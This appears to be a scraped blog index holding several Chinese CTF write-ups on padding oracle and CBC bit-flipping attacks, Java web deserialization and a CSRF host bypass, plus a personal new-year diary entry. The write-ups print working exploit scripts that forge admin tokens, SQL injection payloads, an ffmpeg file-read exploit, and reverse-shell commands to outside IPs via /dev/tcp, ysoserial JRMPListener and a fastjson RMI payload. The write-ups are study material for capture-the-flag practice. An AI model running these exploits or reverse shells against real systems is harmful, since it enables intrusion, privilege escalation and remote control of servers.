\u0026#34;utf-8\u0026#34;))} res = requests.get(url, headers=header) #print(res.text, j) print(res.json()) # 205在测试的时候就是解密不成功, 其他的情况要么是解密成功但是不符合要求和符和要求的 if res.json()[\u0026#39;code\u0026#39;] != 205: get = (j ^ i).to_bytes(1, \u0026#39;little\u0026#39;) + get print(get, i) break # 这里存疑, 为什么是不是signed_key_decoded[(block+1)*16 + i]呢 plain = b\u0026#34;\u0026#34;.join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, \u0026#39;little\u0026#39;) for i in range(N)]) print(plain.decode(\u0026#34;utf-8\u0026#34;), \u0026#34;block=%d\u0026#34; % block) total_plain += plain.decode(\u0026#34;utf-8\u0026#34;) print(total_plain) return total_plain plain_text = padding_oracle(\u0026#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9\u0026#34;) print(plain_text) 慢慢的可以跑出来明文, (假装跑出来了, 其实因为buu的防护请求多了直接断开连接, 但是可以跑出几位)\n{\u0026#34;role\u0026#34;:3,\u0026#34;user_id\u0026#34;:1,\u0026#34;payload\u0026#34;:\u0026#34;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv\u0026#34;,\u0026#34;expire_in\u0026#34;:1580668951} 那么这个signed_key就是给后面的明文作为一个验证使用.\n之前的那个没有权限登录, 就是这个role的关系, 要把它修改成1 , 就要把密文也修改了, 利用cbc字节反转攻击来修改密文.\n由于要修改的明文只是在第一区块中, 因此只需要修改IV就行了, 设 原明文为PB, 修改后的明文为PA\nC[i] ^ PB[i] = IV[i] C[i] ^ PA[i] = new_IV[i] C[i] = PB[i] ^ IV[i] PB[i] ^ PA[i] ^ IV[i] = new_IV[i] 还是偷来的脚本\n#!/usr/bin/python2.7 # -*- coding:utf8 -*- import requests import base64 import json host = \u0026#34;dd8b9a48-d183-45ea-831c-2fe0eb2b7e29.node3.buuoj.cn\u0026#34; def cbc_attack(key, block, origin_content, target_content): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode[\u0026#39;signed_key\u0026#39;] cipher_o = base64.b64decode(signed_key) if block \u0026gt; 0: iv_prefix = cipher_o[:block * 16] else: iv_prefix = \u0026#39;\u0026#39; iv = cipher_o[block * 16:16 + block * 16] cipher = cipher_o[16 + block * 16:] iv_array = bytearray(iv) for i in range(0, 16): iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i]) iv = bytes(iv_array) user_key_json_decode[\u0026#39;signed_key\u0026#39;] = base64.b64encode(iv_prefix + iv + cipher) return base64.b64encode(json.dumps(user_key_json_decode)) def get_user_info(key): r = requests.post(\u0026#34;http://\u0026#34; + host + \u0026#34;/frontend/api/v1/user/info\u0026#34;, headers = {\u0026#34;Key\u0026#34;: key}) if r.json()[\u0026#39;code\u0026#39;] == 100: print(\u0026#34;获取成功！\u0026#34;) return r.json()[\u0026#39;data\u0026#39;] def modify_role_palin(key, role): user_key_decode = base64.b64decode(user_key) user_key_json_decode = json.loads(user_key_decode) user_key_json_decode[\u0026#39;role\u0026#39;] = role return base64.b64encode(json.dumps(user_key_json_decode)) print(\u0026#34;翻转 Key:\u0026#34;) user_key = cbc_attack(\u0026#34;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9\u0026#34;, 0, \u0026#39;{\u0026#34;role\u0026#34;:3,\u0026#34;user_\u0026#39;, \u0026#39;{\u0026#34;role\u0026#34;:1,\u0026#34;user_\u0026#39;) user_key = modify_role_palin(user_key, 1) print(user_key) print(\u0026#34;测试拉取用户信息：\u0026#34;) user_info = get_user_info(user_key) print(user_info) 改完后把新的密文作为key访问, 刷新页面, 成功登录, 发现音频上传的功能.看赵师傅wp说上传不同类型的文件然后下载上传的文件(如下图上传后可以在network中发现url), 对比上传前后文件的md5值发现对avi文件有进行处理, 这个姿势学到了.\n猜测后台使用ffmpeg来对音视频进行处理(misc的东西我一点猜不到), 然后使用对应的漏洞\nhttps://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py\npython3 gen_xbin_avi.py file:///flag test.avi 上传, 下载, 播放, 发现flag\n实验吧 简单的登陆题 真难\n# -*- coding:utf-8 -*- from base64 import * import urllib import requests import re def denglu(payload,idx,c1,c2): url=r\u0026#39;http://ctf5.shiyanbar.com/web/jiandan/index.php\u0026#39; payload = {\u0026#39;id\u0026#39;: payload} r = requests.post(url, data=payload) Set_Cookie=r.headers[\u0026#39;Set-Cookie\u0026#39;] iv=re.findall(r\u0026#34;iv=(.*?),\u0026#34;, Set_Cookie)[0] cipher=re.findall(r\u0026#34;cipher=(.*)\u0026#34;, Set_Cookie)[0] iv_raw = b64decode(urllib.unquote(iv)) cipher_raw=b64decode(urllib.unquote(cipher)) lst=list(cipher_raw) lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2)) cipher_new=\u0026#39;\u0026#39;.join(lst) cipher_new=urllib.quote(b64encode(cipher_new)) cookie_new={\u0026#39;iv\u0026#39;: iv,\u0026#39;cipher\u0026#39;:cipher_new} r = requests.post(url, cookies=cookie_new) cont=r.content plain = re.findall(r\u0026#34;base64_decode\\(\u0026#39;(.*?)\u0026#39;\\)\u0026#34;, cont)[0] plain = b64decode(plain) first=\u0026#39;a:1:{s:2:\u0026#34;id\u0026#34;;s:\u0026#39; iv_new=\u0026#39;\u0026#39; for i in range(16): iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i])) iv_new = urllib.quote(b64encode(iv_new)) cookie_new = {\u0026#39;iv\u0026#39;: iv_new, \u0026#39;cipher\u0026#39;: cipher_new} r = requests.post(url, cookies=cookie_new) rcont = r.content print rcont denglu(\u0026#39;12\u0026#39;,4,\u0026#39;2\u0026#39;,\u0026#39;#\u0026#39;) denglu(\u0026#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);\u0026#39;+chr(0),6,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) denglu(\u0026#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);\u0026#39;+chr(0),7,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) denglu(\u0026#34;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp \u0026#39;you_want\u0026#39;)b join (select 3)c);\u0026#34;+chr(0),7,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) denglu(\u0026#34;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);\u0026#34;+chr(0),6,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) 自己的脚本会出现错误\nimport requests import base64 import urllib import re url=\u0026#39;http://ctf5.shiyanbar.com/web/jiandan/index.php\u0026#39; post={\u0026#39;id\u0026#39;:\u0026#34;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);\u0026#34;+chr(0)} responce=requests.post(url,data=post) iv=base64.b64decode(urllib.unquote(re.findall(r\u0026#34;iv=(.*?),\u0026#34;,responce.headers[\u0026#39;Set-Cookie\u0026#39;])[0])) cipher=base64.b64decode(urllib.unquote(re.findall(r\u0026#34;cipher=(.*)\u0026#34;,responce.headers[\u0026#39;Set-Cookie\u0026#39;])[0])) def answer(cipher,old_iv,offset,old_letter,new_letter): cipher=list(cipher) cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset])) cipher=\u0026#39;\u0026#39;.join(cipher) cookie={\u0026#39;cipher\u0026#39;:urllib.quote(base64.b64encode(cipher)),\u0026#39;iv\u0026#39;:urllib.quote(base64.b64encode(old_iv))} res=requests.post(url,cookies=cookie) wrong_plain=base64.b64decode(re.findall(r\u0026#34;base64_decode\\(\u0026#39;(.*?)\u0026#39;\\)\u0026#34;,res.content)[0]) new_iv = \u0026#39;\u0026#39; right=\u0026#39;a:1:{s:2:\u0026#34;id\u0026#34;;s:\u0026#39; for i in range(16): new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i])) cookie={\u0026#39;cipher\u0026#39;:urllib.quote(base64.b64encode(cipher)),\u0026#39;iv\u0026#39;:urllib.quote(base64.b64encode(new_iv))} res=requests.post(url,cookies=cookie) print res.content answer(cipher,iv,7,\u0026#39;2\u0026#39;,\u0026#39;u\u0026#39;) 错误报告如下：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;2)ion select * from((select 1)a join (select 2)b join (select 3)c);\u0026#39; at line 1 也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题? 明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的 一个偏移位置为6，一个为7，这个正则要好好看看\njavisoj xman 2019 xbitf 源代码如下：\nclass Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr) import sys sys.stdout = Unbuffered(sys.stdout) #import signal #signal.alarm(600) import random import time flag=open(\u0026#34;/root/xbitf/flag\u0026#34;,\u0026#34;r\u0026#34;).read() from Crypto.Cipher import AES import os def aes_cbc(key,iv,m): handler=AES.new(key,AES.MODE_CBC,iv) return handler.encrypt(m).encode(\u0026#34;hex\u0026#34;) def aes_cbc_dec(key,iv,c): handler=AES.new(key,AES.MODE_CBC,iv) return handler.decrypt(c.decode(\u0026#34;hex\u0026#34;)) key=os.urandom(16) iv=os.urandom(16) session=os.urandom(8) token=\u0026#34;session=\u0026#34;+session.encode(\u0026#34;hex\u0026#34;)+\u0026#34;;admin=0\u0026#34; checksum=aes_cbc(key,iv,token) print token+\u0026#34;;checksum=\u0026#34;+checksum for i in range(10): token_rcv=raw_input(\u0026#34;token:\u0026#34;) if token_rcv.split(\u0026#34;admin=\u0026#34;)[1][0]==\u0026#39;1\u0026#39; and token_rcv.split(\u0026#34;session=\u0026#34;)[1][0:16].decode(\u0026#34;hex\u0026#34;)==session: c_rcv=token_rcv.split(\u0026#34;checksum=\u0026#34;)[1].strip() m_rcv=aes_cbc_dec(key,iv,c_rcv) # 讲解码的结果打印出来 print m_rcv if m_rcv.split(\u0026#34;admin=\u0026#34;)[1][0]==\u0026#39;1\u0026#39;: print flag 解题脚本\nplain = \u0026#34;session=c3b76cc709a8fddf;admin=0\u0026#34; checksum=\u0026#34;92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29\u0026#34; bit = (ord(checksum.decode(\u0026#39;hex\u0026#39;)[15]) ^ord(\u0026#39;0\u0026#39;) ^ ord(\u0026#39;1\u0026#39;)) # 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容 checksum_final = checksum[:30] + hex(bit)[2:] + checksum[32:] print checksum_final 在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。\nbugku login4 这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：\nhttps://blog.csdn.net/zpy1998zpy/article/details/80684485\nhttps://www.jianshu.com/p/a61756e54f4f\n自己的代码如下：\n\u0026lt;?php $iv=\u0026#39;4NyZMJ9AOU5JGstqfld10A%3D%3D\u0026#39;; $cipher=\u0026#39;T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D\u0026#39;; //username=bdmin password=111 $iv=base64_decode(urldecode($iv)); $cipher=base64_decode(urldecode(($cipher))); $source=array(\u0026#39;username\u0026#39;=\u0026gt;\u0026#39;bdmin\u0026#39;,\u0026#39;password\u0026#39;=\u0026gt;\u0026#39;111\u0026#39;); $plain=serialize($source); $plain1 = substr($plain,0,16); $plain2 = substr($plain,16,16); $cipher[9] = chr(ord($cipher[9])^ord(\u0026#39;b\u0026#39;)^ord(\u0026#39;a\u0026#39;)); $new_iv=\u0026#39;\u0026#39;; $wrong_plain=base64_decode(\u0026#34;U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ==\u0026#34;); for($i=0;$i\u0026lt;16;$i++){ $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i])); } echo urlencode(base64_encode($new_iv)).\u0026#39; \u0026#39;.urlencode(base64_encode($cipher)); ","permalink":"https://ch3n9w.github.io/posts/sec-padding-oracle-and-cbc-attack/","summary":"\u003cp\u003epadding oracle 原理: \u003ca href=\"https://www.freebuf.com/articles/database/150606.html\"\u003ehttps://www.freebuf.com/articles/database/150606.html\u003c/a\u003e\u003c/p\u003e","title":"padding_oracle 和 cbc字节反转"},{"content":"昨晚约好的车今天早上竟然被司机一声不吭取消了, 真的无语\u0026hellip;\u0026hellip;得亏睡得浅起床看了一眼.新约的车又要早早开往机场, 于是无奈起了个大早. 到达后又被通知延误, 也不知和离开时候的飞雪有无关系, 但不管怎样, 孤身顶着鹅毛行走路上, 这样离开倒还是别有风味, 于是也有了碎碎念的兴致.\n今年的事情较去年简单了很多, 也没那么多想法, 总结起来无非就是把系统换成了ubuntu又换回了windows, 在环境上下了很多功夫, 浪费了很多时间, 打了几次被带飞的比赛, 去了趟xman, 认识了一些很有趣的朋友和网友, 然后觉得自己更加的菜要努力了, 其他没了.\n没了?\n看起来的确是这样平淡的一年, 也没有什么特别值得纪念的事情, 就在自己怀着\u0026quot;啊又是平淡的一年啊\u0026quot;的心态准备开始2020的时候, 由于一些意外, 我开始追求自己喜欢的姑娘了. 虽然不知道结果如何, 反正不后悔就是了, 临阵脱逃这种事情要是做了会被自己看不起的.\n另外, 也得列个新年计划吧, 不然可太水了:\n学会java web django搭博客 flask 搭博客 每天至少刷题一道web一道密码 每天回忆复习, 每周回忆和复习 每天吃水果 看完书 web前端黑客技术解密 白帽子讲web安全 10点之后不看b站, 早睡早起 ","permalink":"https://ch3n9w.github.io/posts/gossip-note-before-back/","summary":"\u003cp\u003e昨晚约好的车今天早上竟然被司机一声不吭取消了, 真的无语\u0026hellip;\u0026hellip;得亏睡得浅起床看了一眼.新约的车又要早早开往机场, 于是无奈起了个大早. 到达后又被通知延误, 也不知和离开时候的飞雪有无关系, 但不管怎样, 孤身顶着鹅毛行走路上, 这样离开倒还是别有风味, 于是也有了碎碎念的兴致.\u003c/p\u003e","title":"临行前夜--2019"},{"content":"开一个新坑~~\n2020 网鼎杯 filejava 读目录可以爆出绝对路径\n读下tomcat的日志(logs/catalina.out), 看到一个war包, 下载, 看到upload的时候会解析\nif (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName)) { try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException var20) { System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;); var20.printStackTrace(); } } 然后参考https://www.jishuwen.com/d/2inW/zh-hk 把workbook.xml和content-type.xml都改了\n2020 VNCTF easyspringmvc 考察java反序列化\n下载war包后用jd-gui打开看源代码, 目录结构\n主要看classes.com下面的\nPictureController.class\npackage WEB-INF.classes.com.controller; import com.controller.PictureController; import com.tools.ClientInfo; import java.io.File; import java.io.FileInputStream; import java.io.InputStream; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.apache.commons.fileupload.disk.DiskFileItem; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.multipart.commons.CommonsMultipartFile; @Controller public class PictureController { @RequestMapping({\u0026#34;/showpic.form\u0026#34;}) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception { if (file == null) file = \u0026#34;showpic.jsp\u0026#34;; String[] attribute = file.split(\u0026#34;\\\\.\u0026#34;); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(\u0026#34;jsp\u0026#34;)) { boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(\u0026#34;cinfo\u0026#34;)).getName().equals(\u0026#34;admin\u0026#34;); if (!isadmin \u0026amp;\u0026amp; (!suffix.equals(\u0026#34;jpg\u0026#34;) || !suffix.equals(\u0026#34;gif\u0026#34;))) { return \u0026#34;onlypic\u0026#34;; } show(httpServletRequest, httpServletResponse, file); return \u0026#34;showpic\u0026#34;; } StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i \u0026lt; attribute.length - 1; i++) { stringBuilder.append(attribute[i]); } String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf(\u0026#39;/\u0026#39;); int winSep = jspFile.lastIndexOf(\u0026#39;\\\\\u0026#39;); int pos = (winSep \u0026gt; unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(\u0026#34;\u0026#34;)) { jspFile = \u0026#34;showpic\u0026#34;; } return jspFile; } private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception { httpServletResponse.setContentType(\u0026#34;image/jpeg\u0026#34;); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\u0026#34;/WEB-INF/resource/\u0026#34; + filename); if (in == null) { in = new FileInputStream(filename); } ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) { servletOutputStream.write(b); } in.close(); servletOutputStream.flush(); servletOutputStream.close(); } @RequestMapping({\u0026#34;/uploadpic.form\u0026#34;}) public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception { ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute(\u0026#34;cinfo\u0026#34;); if (!cinfo.getGroup().equals(\u0026#34;webmanager\u0026#34;)) return \u0026#34;notaccess\u0026#34;; if (file == null) { return \u0026#34;uploadpic\u0026#34;; } String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName(); String realPath = request.getSession().getServletContext().getRealPath(\u0026#34;/WEB-INF/resource/\u0026#34;); String path = realPath + originalFilename; file.transferTo(new File(path)); request.getSession().setAttribute(\u0026#34;newpicfile\u0026#34;, path); return \u0026#34;uploadpic\u0026#34;; } } 主要用于文件的读取和写入, 会去通过cookie校验身份.\nClientInfoFilter.class\npackage WEB-INF.classes.com.filters; import com.tools.ClientInfo; import com.tools.Tools; import java.io.IOException; import java.util.Base64; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ClentInfoFilter implements Filter { public void init(FilterConfig fcg) {} public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { Cookie[] cookies = ((HttpServletRequest)request).getCookies(); boolean exist = false; Cookie cookie = null; if (cookies != null) { for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;cinfo\u0026#34;)) { exist = true; cookie = c; break; } } } if (exist) { String b64 = cookie.getValue(); Base64.Decoder decoder = Base64.getDecoder(); byte[] bytes = decoder.decode(b64); ClientInfo cinfo = null; if (b64.equals(\u0026#34;\u0026#34;) || bytes == null) { cinfo = new ClientInfo(\u0026#34;Anonymous\u0026#34;, \u0026#34;normal\u0026#34;, ((HttpServletRequest)request).getRequestedSessionId()); Base64.Encoder encoder = Base64.getEncoder(); try { bytes = Tools.create(cinfo); } catch (Exception e) { e.printStackTrace(); } cookie.setValue(encoder.encodeToString(bytes)); } else { try { cinfo = (ClientInfo)Tools.parse(bytes); } catch (Exception e) { e.printStackTrace(); } } ((HttpServletRequest)request).getSession().setAttribute(\u0026#34;cinfo\u0026#34;, cinfo); } else { Base64.Encoder encoder = Base64.getEncoder(); try { ClientInfo cinfo = new ClientInfo(\u0026#34;Anonymous\u0026#34;, \u0026#34;normal\u0026#34;, ((HttpServletRequest)request).getRequestedSessionId()); byte[] bytes = Tools.create(cinfo); cookie = new Cookie(\u0026#34;cinfo\u0026#34;, encoder.encodeToString(bytes)); cookie.setMaxAge(86400); ((HttpServletResponse)response).addCookie(cookie); ((HttpServletRequest)request).getSession().setAttribute(\u0026#34;cinfo\u0026#34;, cinfo); } catch (Exception e) { e.printStackTrace(); } } chain.doFilter(request, response); } public void destroy() {} } 控制cookie中cinfo项, 并通过cinfo来校验身份, 如果是第一次访问就会给你设置一个cinfo, 身份是Anonymous, 组别是normal\nClientInfo.class\npackage WEB-INF.classes.com.tools; import com.tools.ClientInfo; import java.io.Serializable; public class ClientInfo implements Serializable { private static final long serialVersionUID = 1L; private String name; private String group; private String id; public ClientInfo(String name, String group, String id) { this.name = name; this.group = group; this.id = id; } public String getName() { return this.name; } public String getGroup() { return this.group; } public String getId() { return this.id; } } 用于存储用户信息, 会被拿来序列化和base64之后作为cinfo的内容.\nTool.class\npackage WEB-INF.classes.com.tools; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String testCall; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } } Serializeable接口会去查看当前类中是否定义writeObject readObject如果有的话, 序列化和反序列化就用这两个方法来实现, 否则就用Serializeable 内置的接口去进行序列化反序列化的操作.\n总结起来可能的点\n读文件 反序列化 读文件首先要admin登录才行, 从源码中可以知道用户名用户组, 接下来写java来伪造cinfo.\n创建java项目, 拷贝源码, 目录结构如下(由于序列化的时候会带进命名空间信息, 所以一定要对的上)\nMain.java\nimport java.util.Base64; import com.tools.Tools; import com.tools.ClientInfo; public class Main { public static void main(String[] args) { try { ClientInfo cinfo = new ClientInfo(\u0026#34;admin\u0026#34;, \u0026#34;webmanager\u0026#34;, \u0026#34;B18D77761C9C952BEDB6CDAC4205265B\u0026#34;); byte[] bytes = Tools.create(cinfo); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); } catch (Exception e) { e.printStackTrace(); } } } 伪造admin登录后尝试读文件, 这里有个疑惑的地方, 看源码文件读取的路径是直接和/WEB-INF/resource/拼接在一起的, 看赵师傅的wp中是靠/../../etc/passwd和它拼接之后可以读到文件, 这样的话路径就是/WEB-INF/resource//../../etc/passwd了, 然后我尝试不用/开头去拼接成/WEB-INF/resource/../../../../../../etc/passwd不管加多少个../都读不到对应的文件, 很是困惑. 然后读/../../flag显示没有权限.\n写文件的功能114告诉我可以往../../../../../../../../tmp下面写, 具体多少个../我忘了\u0026hellip;.但是没有文件包含的地方.\n至此文件读取部分走不通了.\n反序列化部分.\nTools.java中这段代码\nprivate void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } 其中的ProcessBuilder是可以执行系统命令的.\nhttps://blog.csdn.net/wangmx1993328/article/details/80838768\n那可以考虑让反序列化的cinfo内容不是Clientinfo的序列化内容而是Tools的序列化内容.\n将Tools.java中添加\nprivate String testCall[]; public String[] getTestCall() { return testCall; } public void setTestCall(String[] testCall) { this.testCall = testCall; } Main.java\nimport java.util.Base64; import com.tools.Tools; import com.tools.ClientInfo; public class Main { public static void main(String[] args) { try { String[] cmd = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -i\u0026gt;\u0026amp; /dev/tcp/174.0.220.248/9999 0\u0026gt;\u0026amp;1\u0026#34;}; Tools tools = new Tools(); tools.setTestCall(cmd); byte[] bytes = Tools.create(tools); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); } catch (Exception e) { e.printStackTrace(); } } } 反弹shell\n最后一步还是有些不明白的地方, 回头来看.\n2019 空指针ctf 公开赛 hint页面要求是admin才能访问, 那么思路大概清楚了, 就是通过csrf让admin去访问hint然后把响应内容发送回来, 比赛的时候没看js代码就做题就是铁憨憨行为.\nfunction isProd(){ return window.location.host==\u0026#39;treasure.npointer.cn\u0026#39;; } function loadPage() { if (!window.location.hash) { window.location.hash = \u0026#39;#home\u0026#39; } url = window.location.hash.substring(1)+\u0026#39;.html\u0026#39;; //调试太麻烦了，日常测试放开限制 if(isProd()) { url = window.location.origin + \u0026#39;/\u0026#39; + url; } $.get(url, function(result){ $(\u0026#34;#content\u0026#34;).html(result); }); } window.addEventListener(\u0026#39;hashchange\u0026#39;,function(event){ loadPage(); }); loadPage(); 简单理解一下就是: 当锚点变化的时候, 就判断host, 如果host是treasure.npointer.cn就加载treasure.npointer.cn加锚点加html的值, 如果不是, 那么就直接加载锚点加上html的值, payload\nhttp://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot 这里域名后面的./也是第一次见识, 他确实能访问到treasure.npointer.cn但是host名不再是treasure.npointer.cn了, 那么就可以绕过对主机名的判断直接请求锚点后面的值了.\n这里有点坑, 其实是自己第一次接触太菜了.因为同源策略的影响, 服务端那边必须要设置Access-Control-Allow-Origin=*否则vps那边会拒绝跨域请求\n使用以下脚本在同目录下执行开启python的服务器\n#!/usr/bin/env python # -*- coding: utf-8 -*- try: from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig import sys def test (*args): test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) \u0026gt; 1 else 8000) except ImportError: # Python 2 from BaseHTTPServer import HTTPServer, test from SimpleHTTPServer import SimpleHTTPRequestHandler class CORSRequestHandler (SimpleHTTPRequestHandler): def end_headers (self): self.send_header(\u0026#39;Access-Control-Allow-Origin\u0026#39;, \u0026#39;*\u0026#39;) SimpleHTTPRequestHandler.end_headers(self) if __name__ == \u0026#39;__main__\u0026#39;: test(CORSRequestHandler, HTTPServer) 然后发送\nhttp://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot nc接受到了源代码.\n(分析过程以后补上)\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\nvps上面执行\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 \u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTc2LjM3Lzk5OTkgMD4mMQo=}|{base64,-d}|{bash,-i}\u0026#39; 通过submit发送\n{\u0026#34;@\\u0074ype\u0026#34;:\u0026#34;org.apache.commons.proxy.provider.remoting.RmiProvider\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;39.105.176.37\u0026#34;,port:\u0026#34;1088\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Object\u0026#34;} ","permalink":"https://ch3n9w.github.io/posts/sec-java-web/","summary":"\u003cp\u003e开一个新坑~~\u003c/p\u003e","title":"java_web题目复现记录"},{"content":"贴几个参考链接\nhttps://www.cnblogs.com/wfzWebSecuity/p/11213732.html\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\nbyteCTF babyblog 看首页\n功能点\n写博客 编辑博客 删除博客 查找字符串并替换 这个replace有点诡异, 需要vip身份, 看源代码关键的一步在edit.php中\nif(isset($_POST[\u0026#39;title\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;content\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;id\u0026#39;])){ foreach($sql-\u0026gt;query(\u0026#34;select * from article where id=\u0026#34; . intval($_POST[\u0026#39;id\u0026#39;]) . \u0026#34;;\u0026#34;) as $v){ $row = $v; } if($_SESSION[\u0026#39;id\u0026#39;] == $row[\u0026#39;userid\u0026#39;]){ $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql-\u0026gt;query(\u0026#34;update article set title=\u0026#39;$title\u0026#39;,content=\u0026#39;$content\u0026#39; where title=\u0026#39;\u0026#34; . $row[\u0026#39;title\u0026#39;] . \u0026#34;\u0026#39;;\u0026#34;); exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Edited successfully.\u0026#39;);location.href=\u0026#39;index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); }else{ exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;You do not have 